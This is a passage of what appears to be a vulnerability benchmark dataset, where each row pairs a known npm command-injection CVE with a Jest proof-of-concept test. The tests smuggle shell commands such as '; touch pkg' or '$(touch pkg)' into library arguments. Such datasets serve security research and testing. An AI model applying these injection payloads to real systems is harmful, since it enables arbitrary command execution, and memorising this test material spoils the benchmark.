",https://github.com/sorellabs/xps/commit/768481146b8ead3811310eecc0f56e2d107cb740,lib/utils.js:28:5,https://security.snyk.io/vuln/SNYK-JS-XPS-590098; https://github.com/advisories/GHSA-wp7m-mrvf-599c
command-injection,CVE-2018-3757,pdf-image,1.0.5,2.0.1,command-injection/pdf-image_1.0.5,"test(""Command Injection in pdf-image"", () => {
  expect.assertions(2);
  const PDFImage = require(""pdf-image"").PDFImage;
  const fs = require(""fs"");
  const path = ""./pdf-image"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let pdfImage = new PDFImage('asd.pdf""; touch pdf-image""');
  try {
    return pdfImage.numberOfPages().then(function (imagePath) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (e) {}
});
",https://github.com/roest01/node-pdf-image/commit/54679496a89738443917608c2bbe2f6e5dd20e83,index.js:43:7,https://security.snyk.io/vuln/npm:pdf-image:20180529; https://github.com/advisories/GHSA-5gwh-g79j-vh4q
command-injection,CVE-2020-7730,bestzip,2.1.6,2.1.7,command-injection/bestzip_2.1.6,"test(""Command Injection in bestzip"", (done) => {
  expect.assertions(2);
  const zip = require(""bestzip"");
  const fs = require(""fs"");
  const path = ""./bestzip"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  zip({
    source: """",
    destination: ""./; touch bestzip"",
  }).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  });
});
",https://github.com/nfriedly/node-bestzip/commit/45d4a901478c6a8f396c8b959dd6cf8fd3f955b6,lib/bestzip.js:27:27,https://security.snyk.io/vuln/SNYK-JS-BESTZIP-609371; https://github.com/advisories/GHSA-6xv6-jpvw-cx6q
command-injection,,git-lib,1.6.0,,command-injection/git-lib_1.6.0,"test(""Remote code execution in git-lib"", () => {
  expect.assertions(2);
  const git = require(""git-lib"");
  const fs = require(""fs"");
  const path = ""./git-lib"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    return git.add(""test;touch git-lib;"").finally(function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
",,git.js:13:9,https://security.snyk.io/vuln/SNYK-JS-GITLIB-1012734; 
command-injection,CVE-2021-23377,onion-oled-js,0.0.2,,command-injection/onion-oled-js_0.0.2,"test(""Command Injection in onion-oled-js"", () => {
  expect.assertions(2);
  const OLEDExp = require(""onion-oled-js"").OLEDExp;
  const fs = require(""fs"");
  const path = ""./onion-oled-js"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return OLEDExp.scroll("";touch onion-oled-js #"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,src/oled-exp.js:91:16,https://security.snyk.io/vuln/SNYK-JS-ONIONOLEDJS-1078808; https://github.com/advisories/GHSA-rhwp-9vm9-547q
command-injection,,gry,5.0.8,6.0.0,command-injection/gry_5.0.8,"test(""Command Injection in gry"", (done) => {
  expect.assertions(2);
  const Repo = require(""gry"");
  const fs = require(""fs"");
  const path = ""./gry"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let myRepo = new Repo(""."");
  myRepo.pull(""test; touch gry; #"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/index.js:88:20,https://security.snyk.io/vuln/SNYK-JS-GRY-566987; 
command-injection,CVE-2018-3772,whereis,0.4.0,0.4.1,command-injection/whereis_0.4.0,"test(""Command Injection in whereis"", (done) => {
  expect.assertions(2);
  const whereis = require(""whereis"");
  const fs = require(""fs"");
  const path = ""./whereis"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let filename = ""; touch whereis"";
  whereis(filename, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/vvo/node-whereis/commit/0f64e3780235004fb6e43bfd153ea3e0e210ee2b,index.js:4:6,https://security.snyk.io/vuln/npm:whereis:20180401; https://github.com/advisories/GHSA-wjr4-2jgw-hmv8
command-injection,,node-unrar,0.1.0,,command-injection/node-unrar_0.1.0,"test(""Remote code execution in node-unrar"", (done) => {
  expect.assertions(2);
  const Unrar = require(""node-unrar"");
  const fs = require(""fs"");
  const path = ""./node-unrar"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    var rar = new Unrar(""/path/to/file.rar"");
    rar._execute([], ""; touch node-unrar;"", function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",,lib/index.js:23:3,; 
command-injection,CVE-2019-15609,kill-port-process,0.0.1,2.2.0,command-injection/kill-port-process_0.0.1,"test(""Command Injection in kill-port-process"", () => {
  expect.assertions(2);
  const killPortProcess = require(""kill-port-process"");
  const fs = require(""fs"");
  const path = ""./kill-port-process"";
  const PORT = ""$(touch kill-port-process)"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return killPortProcess(PORT)
    .then(() => {
      console.log(""here!"");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
    })
    .catch((err) => {})
    .finally(() => {
      console.log(""here!!!!"");
      if (fs.existsSync(path)) {
        fs.unlinkSync(path);
        console.log(""File removed!:"", path);
      }
    });
});
",,src/index.js:44:4,https://security.snyk.io/vuln/SNYK-JS-KILLPORTPROCESS-543829; 
command-injection,CVE-2020-7632,node-mpv,0.12.2,,command-injection/node-mpv_0.12.2,"test(""Command Injection in node-mpv"", () => {
  expect.assertions(2);
  const Root = require(""node-mpv"");
  const fs = require(""fs"");
  const path = ""./node-mpv"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var options = { binary: '"" $(touch node-mpv) ""' };
  try {
    var root = new Root(options);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,lib/mpv/mpv.js:45:16,https://security.snyk.io/vuln/SNYK-JS-NODEMPV-564426; https://github.com/advisories/GHSA-cqr2-xhg6-p268
command-injection,CVE-2021-23360,killport,1.0.1,1.0.2,command-injection/killport_1.0.1,"test(""Command Injection in killport"", () => {
  expect.assertions(2);
  const killport = require(""killport"");
  const fs = require(""fs"");
  const path = ""./killport"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return killport(""$(touch killport); #"").catch(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",https://github.com/ssnau/killport/commit/bec8e371f170a12e11cd222ffc7a6e1ae9942638,index.js:9:8,https://security.snyk.io/vuln/SNYK-JS-KILLPORT-1078535; https://github.com/advisories/GHSA-fc42-h7q4-qp8h
command-injection,CVE-2021-23356,kill-process-by-name,1.0.5,,command-injection/kill-process-by-name_1.0.5,"test(""Command Injection in kill-process-by-name"", (done) => {
  expect.assertions(2);
  const kill_process_by_name = require(""kill-process-by-name"");
  const fs = require(""fs"");
  const path = ""./kill-process-by-name"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_process_by_name(""$(touch kill-process-by-name)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,index.js:12:18,https://security.snyk.io/vuln/SNYK-JS-KILLPROCESSBYNAME-1078534; https://github.com/advisories/GHSA-qc65-cgvr-93p6
command-injection,CVE-2021-23376,ffmpegdotjs,0.0.4,,command-injection/ffmpegdotjs_0.0.4,"test(""Command Injection in ffmpegdotjs"", () => {
  expect.assertions(2);
  let ffmpegdotjs = require(""ffmpegdotjs"");
  const fs = require(""fs"");
  const path = ""./ffmpegdotjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return ffmpegdotjs
    .trimvideo(""package-lock.json"", 0, 30, ""n || touch ffmpegdotjs; #"")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,index.js:191:9,https://security.snyk.io/vuln/SNYK-JS-FFMPEGDOTJS-1078542; https://github.com/advisories/GHSA-f39r-cpmj-whcg
command-injection,,npm-git-publish,0.2.4-beta,,command-injection/npm-git-publish_0.2.4-beta,"test(""Command Injection in npm-git-publish"", () => {
  expect.assertions(2);
  const git = require(""npm-git-publish"");
  const fs = require(""fs"");
  const path = ""./npm-git-publish"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return git
    .publish(""."", ""http://gihub.com ;touch npm-git-publish; #"")
    .catch(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.rmSync(""./gihub.com"", {
        recursive: true,
        force: true,
      });
      fs.unlink(path, function (err) {});
    });
});
",,lib/publish.js:92:29,https://security.snyk.io/vuln/SNYK-JS-NPMGITPUBLISH-541508; https://github.com/advisories/GHSA-49mg-94fc-2fx6
command-injection,CVE-2019-10783,vboxmanage.js,1.0.6,,command-injection/vboxmanage.js_1.0.6,"test(""Command Injection in vboxmanage.js"", () => {
  expect.assertions(2);
  const VBox = require(""vboxmanage.js"");
  const fs = require(""fs"");
  const path = ""./vboxmanag-js"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return VBox.start("";touch vboxmanag-js;"")
    .then(function () {})
    .catch(() => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",https://github.com/danielgindi/node-vboxmanage/commit/8efe421dd19c474cbdeb0908cbcc7aabfe343d5e,index.js:76:23,https://security.snyk.io/vuln/SNYK-JS-VBOXMANAGEJS-607910; https://github.com/advisories/GHSA-whq6-mj2r-mjqc
command-injection,CVE-2019-10801,enpeem,2.2.0,,command-injection/enpeem_2.2.0,"test(""Command Injection in enpeem"", (done) => {
  expect.assertions(2);
  const root = require(""enpeem"");
  const fs = require(""fs"");
  const path = ""./enpeem"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch enpeem &"";
  let opts = { production: attack_code };
  root.update(opts, function (err) {
    console.log(""err!"");
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",,index.js:71:22,https://security.snyk.io/vuln/SNYK-JS-ENPEEM-559007; https://github.com/advisories/GHSA-hmw2-mvvh-jf5j
command-injection,CVE-2020-28433,node-latex-pdf,0.0.2,,command-injection/node-latex-pdf_0.0.2,"test(""Command Injection in node-latex-pdf"", (done) => {
  expect.assertions(2);
  const a = require(""node-latex-pdf"");
  const fs = require(""fs"");
  const path = ""./node-latex-pdf"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""./"", ""& touch node-latex-pdf"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlinkSync(path);
    done();
  });
});
",,node-latex-pdf.js:10:5,https://security.snyk.io/vuln/SNYK-JS-NODELATEXPDF-1050426; 
command-injection,CVE-2020-28429,geojson2kml,0.1.1,,command-injection/geojson2kml_0.1.1,"test(""Command Injection in geojson2kml"", (done) => {
  expect.assertions(2);
  const a = require(""geojson2kml"");
  const fs = require(""fs"");
  const path = ""./geojson2kml"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""./"", ""& touch geojson2kml"", function (err) {
    if (err) throw err;
    else {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  });
});
",,index.js:6:3,https://security.snyk.io/vuln/SNYK-JS-GEOJSON2KML-1050412; https://github.com/advisories/GHSA-w83x-fp72-p9qc
command-injection,CVE-2020-7785,node-ps,0.0.2,,command-injection/node-ps_0.0.2,"test(""Command Injection in node-ps"", (done) => {
  expect.assertions(2);
  const a = require(""node-ps"");
  const fs = require(""fs"");
  const path = ""./node-ps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a.lookup({ psargs: [""& touch node-ps #""] }, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/index.js:72:18,https://security.snyk.io/vuln/SNYK-JS-NODEPS-1048335; https://github.com/advisories/GHSA-4rv9-5vc4-88cg
command-injection,CVE-2018-16462,alfred-workflow-nodejs,2.0.1,2.0.1,command-injection/alfred-workflow-nodejs_2.0.1,"test(""Command Injection in killing"", (done) => {
  expect.assertions(2);
  const AlfredNode = require(""alfred-workflow-nodejs"");
  const fs = require(""fs"");
  const path = ""./alfred-workflow-nodejs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var utils = AlfredNode.utils;
  utils.wfVars.remove(' ""; touch alfred-workflow-nodejs #', function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,alfredNode.js:445:17,https://security.snyk.io/vuln/SNYK-JS-ALFREDWORKFLOWNODEJS-608975; https://github.com/advisories/GHSA-9jm3-5835-537m
command-injection,CVE-2020-28437,heroku-env,0.2.0,,command-injection/heroku-env_0.2.0,"test(""Command Injection in heroku-env"", (done) => {
  expect.assertions(2);
  const root = require(""heroku-env"");
  const fs = require(""fs"");
  const path = ""./heroku-env"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(""& touch heroku-env"", ""aa"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,lib/get.js:3:3,https://security.snyk.io/vuln/SNYK-JS-HEROKUENV-1050432; 
command-injection,CVE-2021-26275,eslint-fixer,0.1.5,,command-injection/eslint-fixer_0.1.5,"test(""Command Injection in eslint-fixer"", () => {
  expect.assertions(2);
  const fix = require(""eslint-fixer"");
  const fs = require(""fs"");
  const path = ""./eslint-fixer"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return fix(""$(touch eslint-fixer)"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",,index.js:24:18,https://security.snyk.io/vuln/SNYK-JS-ESLINTFIXER-1087438; https://github.com/advisories/GHSA-45w5-pvr8-4rh5
command-injection,CVE-2017-16042,growl,1.9.0,1.10.0,command-injection/growl_1.9.0,"test(""Command Injection in growl"", (done) => {
  expect.assertions(2);
  const growl = require(""growl"");
  const fs = require(""fs"");
  const path = ""./growl"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  growl(""`touch growl`"", {}, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/tj/node-growl/commit/d71177d5331c9de4658aca62e0ac921f178b0669,lib/growl.js:289:3,https://security.snyk.io/vuln/npm:growl:20160721; https://github.com/advisories/GHSA-qh2h-chj9-jffq
command-injection,CVE-2020-7628,umount,1.1.6,,command-injection/umount_1.1.6,"test(""Command Injection in umount"", (done) => {
  expect.assertions(2);
  const root = require(""umount"");
  const fs = require(""fs"");
  const path = ""./umount"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let device = '"" $(touch umount) ""';
  root.umount(device, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",,build/umount.js:52:24,https://security.snyk.io/vuln/SNYK-JS-UMOUNT-564265; https://github.com/advisories/GHSA-6q48-vjq2-mwcj
command-injection,CVE-2020-7627,node-key-sender,1.0.11,,command-injection/node-key-sender_1.0.11,"test(""Command Injection in node-key-sender"", () => {
  expect.assertions(2);
  const root = require(""node-key-sender"");
  const fs = require(""fs"");
  const path = ""./node-key-sender"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = [""&touch"", ""node-key-sender""];
  return root.execute(attack_code).then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,key-sender.js:117:20,https://security.snyk.io/vuln/SNYK-JS-NODEKEYSENDER-564261; 
command-injection,CVE-2020-28490,async-git,1.13.1,1.13.2,command-injection/async-git_1.13.1,"test(""Command Injection in async-git"", async () => {
  expect.assertions(2);
  const git = require(""async-git"");
  const fs = require(""fs"");
  const path = ""./async-git"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    await git.reset(""$(touch async-git)"");
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/omrilotan/async-git/commit/d1950a5021f4e19d92f347614be0d85ce991510d,lib/reset/index.js:11:16,https://security.snyk.io/vuln/SNYK-JS-ASYNCGIT-1064877; https://github.com/advisories/GHSA-6qpr-9mc5-7gch
command-injection,CVE-2018-3785,git-dummy-commit,1.3.0,,command-injection/git-dummy-commit_1.3.0,"test(""Command Injection in git-dummy-commit"", () => {
  expect.assertions(2);
  const gitDummyCommit = require(""git-dummy-commit"");
  const fs = require(""fs"");
  const path = ""./git-dummy-commit"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gitDummyCommit('"";touch git-dummy-commit;""');
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",,index.js:37:8,https://security.snyk.io/vuln/npm:git-dummy-commit:20180619; https://github.com/advisories/GHSA-h3c2-x77c-7pvr
command-injection,CVE-2019-10788,strider-git,1.0.3,,command-injection/strider-git_1.0.3,"test(""Command Injection in strider-git"", (done) => {
  expect.assertions(2);
  const git = require(""strider-git/lib"");
  const fs = require(""fs"");
  const path = ""./strider-git"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  git.getBranches(
    {
      auth: {
        type: ""ssaas;touch strider-git; "",
        privkey: ""sss"",
      },
      url: ""http://sss"",
    },
    """",
    function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  );
});
",https://github.com/Turistforeningen/node-im-metadata/commit/ea15dddbe0f65694bfde36b78dd488e90f246639,lib/index.js:151:5,https://security.snyk.io/vuln/SNYK-JS-STRIDERGIT-572913; https://github.com/advisories/GHSA-qfxv-qqvg-24pg
command-injection,CVE-2021-23632,git,0.1.5,,command-injection/git_0.1.5,"test(""Remote code execution in git"", (done) => {
  expect.assertions(2);
  const Git = require(""git"").Git;
  const fs = require(""fs"");
  const path = ""./git"";
  let repo = new Git(""repo-test"");
  let user_input = ""; touch git"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    repo.git(user_input, function (err, result) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",,lib/git/git.js:232:3,https://security.snyk.io/vuln/SNYK-JS-GIT-1568518; 
command-injection,CVE-2020-28423,monorepo-build,0.1.9,,command-injection/monorepo-build_0.1.9,"test(""Command Injection in monorepo-build"", (done) => {
  expect.assertions(2);
  var a = require(""monorepo-build"");
  const fs = require(""fs"");
  const path = ""./monorepo-build"";
  var execSync = require(""child_process"").execSync;
  var user_name = """";
  var user_email = """";
  try {
    const cmd = ""git config user.email"";
    user_email = execSync(cmd).toString().trim();
  } catch (error) {}
  try {
    const cmd = ""git config user.name"";
    user_name = execSync(cmd).toString().trim();
  } catch (error) {}
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.build(""./"", ""& touch monorepo-build"");
  } catch (error) {
    console.log(""syntax-error"");
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    try {
      const cmd = `git config user.name ""${user_name}""`;
      execSync(cmd).toString();
    } catch (error) {
      console.log(error);
    }
    try {
      const cmd = `git config user.email ""${user_email}""`;
      execSync(cmd).toString();
    } catch (error) {
      console.log(error);
    }
    done();
  });
});
",,lib/util/exec.js:4:54,https://security.snyk.io/vuln/SNYK-JS-MONOREPOBUILD-1050392; 
command-injection,CVE-2021-23399,wincred,1.0.2,,command-injection/wincred_1.0.2,"test(""Command Injection in wincred"", () => {
  expect.assertions(2);
  const wincred = require(""wincred"");
  const fs = require(""fs"");
  const path = ""./wincred"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return wincred.getCredential(""|| touch wincred"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",,index.js:16:17,https://security.snyk.io/vuln/SNYK-JS-WINCRED-1078538; https://github.com/advisories/GHSA-v85c-hgq5-7pfw
command-injection,CVE-2021-23348,portprocesses,1.0.4,1.0.5,command-injection/portprocesses_1.0.4,"test(""Command Injection in portprocesses"", () => {
  expect.assertions(2);
  const portprocesses = require(""portprocesses"");
  const fs = require(""fs"");
  const path = ""./portprocesses"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return portprocesses.killProcess(""$(touch portprocesses)"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {});
  });
});
",https://github.com/rrainn/PortProcesses/commit/86811216c9b97b01b5722f879f8c88a7aa4214e1,exec.js:5:3,https://security.snyk.io/vuln/SNYK-JS-PORTPROCESSES-1078536; https://github.com/advisories/GHSA-vm67-7vmg-66vm
command-injection,CVE-2021-23379,portkiller,1.0.2,,command-injection/portkiller_1.0.2,"test(""Command Injection in portkiller"", (done) => {
  expect.assertions(2);
  const portkiller = require(""portkiller"");
  const fs = require(""fs"");
  const path = ""./portkiller"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  portkiller(""$(touch portkiller)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",,index.js:10:5,https://security.snyk.io/vuln/SNYK-JS-PORTKILLER-1078537; https://github.com/advisories/GHSA-r6fw-8m27-43c9
command-injection,,local-devices,2.0.0,3.0.0,command-injection/local-devices_2.0.0,"test(""Command Injection in local-devices"", () => {
  expect.assertions(2);
  const find = require(""local-devices"");
  const fs = require(""fs"");
  const path = ""./local-devices"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let userInput = ""127.0.0.1 | touch local-devices"";
  return find(userInput).then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",,src/index.js:114:13,https://security.snyk.io/vuln/SNYK-JS-LOCALDEVICES-459898; https://github.com/advisories/GHSA-w725-67p7-xv22
command-injection,,imagickal,5.0.1,,command-injection/imagickal_5.0.1,"test(""Remote code execution in imagickal"", () => {
  expect.assertions(2);
  const im = require(""imagickal"");
  const fs = require(""fs"");
  const path = ""./imagickal"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return im
    .identify("";touch imagickal;"")
    .catch((err) => {})
    .finally(() => {
      console.log(""finally!"");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",,lib/imagickal.js:127:17,https://security.snyk.io/vuln/SNYK-JS-IMAGICKAL-1060040; 
command-injection,CVE-2021-29300,samsung-remote,1.2.5,1.5.2,command-injection/samsung-remote_1.2.5,"test(""Command Injection in samsung-remote"", (done) => {
  expect.assertions(2);
  const SamsungRemote = require(""samsung-remote"");
  const fs = require(""fs"");
  const path = ""./samsung-remote"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var remote = new SamsungRemote({ ip: ""127.0.0.1; touch samsung-remote;"" });
  remote.isAlive(function (err) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/ronomon/opened/commit/7effe011d4fea8fac7f78c00615e0a6e69af68ec,lib/samsung-remote.js:103:16,https://security.snyk.io/vuln/SNYK-JS-SAMSUNGREMOTE-72278; https://github.com/advisories/GHSA-fg5w-w99f-rj6w
command-injection,CVE-2019-10787,im-resize,2.3.2,,command-injection/im-resize_2.3.2,"test(""Command Injection in im-resize"", (done) => {
  expect.assertions(2);
  const root = require(""im-resize"");
  const fs = require(""fs"");
  const path = ""./im-resize"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
